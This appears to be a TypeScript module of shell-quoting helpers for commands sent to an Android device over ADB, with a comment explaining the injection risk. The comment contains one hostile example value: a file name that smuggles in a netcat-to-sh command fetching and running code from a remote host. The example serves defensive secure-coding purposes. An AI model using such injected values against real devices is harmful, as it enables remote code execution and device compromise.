/**
 * Quoting for commands sent to a device's shell over ADB.
 *
 * ADB has NO execve-argv form: `transport.shell([...])` joins the array with
 * spaces (`formatCommand` in ./transport.ts) and hands the resulting STRING to
 * the device's shell, so every interpolated value is shell source until it is
 * quoted. A name like `a.apk; toybox nc host 4444 | sh ;.apk` would otherwise
 * execute on the Pin with adbd's privileges — and even a plain space silently
 * split the command into nonsense.
 *
 * This lives in its own module because the same discipline is needed by every
 * caller that builds a device command out of a non-literal, not just the
 * installer: keeping one copy is what stops the next call site from quietly
 * reintroducing the hole.
 */

export function shellSingleQuote(value: string): string {
  return "'" + value.replaceAll("'", "'\\''") + "'";
}

/** Build a command that survives ADB's shell service: `sh -c '<quoted argv>'`. */
export function shellCommand(argv: readonly string[]): readonly string[] {
  return ["sh", "-c", shellSingleQuote(argv.map(shellSingleQuote).join(" "))];
}
